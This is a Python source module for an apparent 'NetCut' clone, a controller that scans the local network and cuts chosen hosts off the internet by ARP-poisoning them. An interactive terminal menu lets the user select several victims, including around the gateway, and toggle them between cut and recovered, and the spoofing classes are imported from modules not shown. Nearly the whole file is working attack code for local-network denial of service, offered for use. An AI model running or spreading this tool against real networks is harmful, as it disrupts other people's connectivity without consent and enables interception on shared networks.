import sys
import threading
import atexit
from typing import List, Dict, Optional, Set, Tuple

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
    COLOR_ENABLED = True
except ImportError:
    COLOR_ENABLED = False
    class Fore:
        GREEN = "\033[92m"
        RED = "\033[91m"
        YELLOW = "\033[93m"
        CYAN = "\033[96m"
        RESET = "\033[0m"
    class Style:
        BRIGHT = "\033[1m"
        RESET_ALL = "\033[0m"

from .host import Host, Status
from .interface import Interface
from .scanner import NetworkScanner
from .arp_spoofer import ARPSpoofer, check_l2_support


class NetCutController:
    """
    Main controller for NetCut operations.
    Coordinates scanning, spoofing, target toggling, and clean recovery.
    """

    def __init__(self, attack_interval_s: float = 2.0):
        self.attack_interval_s = attack_interval_s
        self.scanner = NetworkScanner()
        self.interface: Optional[Interface] = None
        self.spoofer = ARPSpoofer(attack_interval_s=attack_interval_s)
        self.hosts: List[Host] = []
        self._host_map: Dict[str, Host] = {}
        self._lock = threading.RLock()

        # Register cleanup handler on normal or abrupt exit
        atexit.register(self.recover_all_hosts)

    def initialize(self):
        """Initializes interfaces and scanner."""
        self.interface = self.scanner.get_default_interface()
        self.spoofer.interface = self.interface

    def get_l2_status(self) -> Tuple[bool, str]:
        """Returns whether the system can inject raw ARP packets."""
        return check_l2_support()

    def scan_targets(self) -> List[Host]:
        """Scans the local network for live hosts and updates the host list."""
        if not self.interface:
            self.initialize()

        # Perform scan WITHOUT holding self._lock to avoid blocking HTTP status requests
        active_hosts = self.scanner.scan_networks(self.interface)

        with self._lock:
            for new_host in active_hosts:
                if new_host.ip_address not in self._host_map:
                    self._host_map[new_host.ip_address] = new_host
                else:
                    existing = self._host_map[new_host.ip_address]
                    if new_host.mac_address:
                        existing.set_mac_address(new_host.mac_address)
                    if new_host.hostname and not existing.hostname:
                        existing.hostname = new_host.hostname

            self.hosts = sorted(self._host_map.values())

        return self.hosts

    def attack(self, target: Host) -> Tuple[bool, str]:
        """
        Cuts target's internet by poisoning its ARP table.
        Returns (success: bool, message: str).
        """
        if not self.interface:
            self.initialize()

        l2_ok, l2_msg = check_l2_support()
        if not l2_ok:
            return False, l2_msg

        with self._lock:
            current_hosts = list(self.hosts)

        for host in current_hosts:
            if host.ip_address == target.ip_address:
                continue
            if not self.interface or not self.interface.is_same_subnet(host.ip_address):
                continue

            success, msg = self.spoofer.start_spoof(target, host)
            if not success:
                return False, msg

        target.set_status(Status.CUT)
        return True, "Target connection cut"

    def recover(self, target: Host) -> Tuple[bool, str]:
        """
        Restores target's legitimate network connectivity.
        """
        if not self.interface:
            self.initialize()

        with self._lock:
            current_hosts = list(self.hosts)

        for host in current_hosts:
            if host.ip_address == target.ip_address:
                continue
            if not self.interface or not self.interface.is_same_subnet(host.ip_address):
                continue

            self.spoofer.stop_spoof(target, host, send_recover=True)

        target.set_status(Status.NORMAL)
        return True, "Target recovered"

    def toggle_target(self, index: int) -> Tuple[Optional[Host], str]:
        """Toggles cut/recover state for a host by its 1-based index."""
        target = self.get_host_by_index(index)
        if not target:
            return None, "Target index out of range"

        if target.is_cut():
            _, msg = self.recover(target)
        else:
            ok, msg = self.attack(target)
            if not ok:
                return target, msg

        return target, "Success"

    def get_host_by_index(self, index: int) -> Optional[Host]:
        """Returns host by 1-based index."""
        zero_index = index - 1
        with self._lock:
            if 0 <= zero_index < len(self.hosts):
                return self.hosts[zero_index]
        return None

    def get_host_by_ip(self, ip: str) -> Optional[Host]:
        """Returns host by IP address."""
        with self._lock:
            return self._host_map.get(ip)

    def recover_all_hosts(self):
        """Restores connectivity for all currently cut hosts."""
        with self._lock:
            cut_hosts = [h for h in self.hosts if h.is_cut()]

        for h in cut_hosts:
            self.recover(h)

        self.spoofer.stop_all()

    def show_targets(self):
        """Displays interactive formatted target list in terminal."""
        self.scan_targets()

        c_green = Fore.GREEN if COLOR_ENABLED else ""
        c_red = Fore.RED if COLOR_ENABLED else ""
        c_yellow = Fore.YELLOW if COLOR_ENABLED else ""
        c_cyan = Fore.CYAN if COLOR_ENABLED else ""
        c_reset = Style.RESET_ALL if COLOR_ENABLED else ""
        c_bright = Style.BRIGHT if COLOR_ENABLED else ""

        l2_ok, l2_msg = check_l2_support()
        if not l2_ok:
            print(f"\n{c_red}[!] WARNING: {l2_msg}{c_reset}")
            print(f"{c_yellow}[i] Install npcap-installer.exe to enable packet injection on Windows.{c_reset}\n")

        iface_info = f"{self.interface.name} ({self.interface.ip})" if self.interface else "Default"
        gw_info = f"Gateway: {self.scanner.gateway_ip or 'Auto'}"

        print(f"\n{c_cyan}{c_bright}========================= NetCut (Python) ========================={c_reset}")
        print(f"Interface: {c_yellow}{iface_info}{c_reset} | {gw_info}")
        print("Select one or more targets by number, separated by space.")
        print("Or enter 'q' to quit, 'r' to refresh targets.")
        print(f"{c_green}[GREEN]{c_reset} : Available target, select to CUT.")
        print(f"{c_red}[RED]{c_reset}   : Already CUT target, select to RECOVER.\n")

        with self._lock:
            for idx, host in enumerate(self.hosts, start=1):
                color = c_red if host.is_cut() else c_green
                status_txt = " [CUT]" if host.is_cut() else ""
                gw_badge = " (Gateway)" if host.ip_address == self.scanner.gateway_ip else ""
                host_label = f" - {host.hostname}" if host.hostname else ""
                print(f"{color}{idx:2d}) {host.ip_address:<16} ({host.mac_address}){gw_badge}{host_label}{status_txt}{c_reset}")

        print(f"\n{c_bright}Targets > {c_reset}", end="", flush=True)

    def parse_and_execute_input(self, user_input: str) -> bool:
        """Parses terminal input."""
        cmd = user_input.strip().lower()

        if cmd == "q":
            print("\nRestoring network connectivity for all targets...")
            self.recover_all_hosts()
            print("Done. Exiting safely.")
            return False

        if cmd == "r" or cmd == "":
            return True

        tokens = cmd.split()
        for token in tokens:
            if token.isdigit():
                idx = int(token)
                target, msg = self.toggle_target(idx)
                if target:
                    if target.is_cut():
                        print(f"Target {idx} ({target.ip_address}): CUT")
                    else:
                        print(f"Target {idx} ({target.ip_address}): RECOVERED")
                else:
                    print(f"Target {idx} error: {msg}")
            else:
                print(f"Ignored invalid input: {token}")

        return True
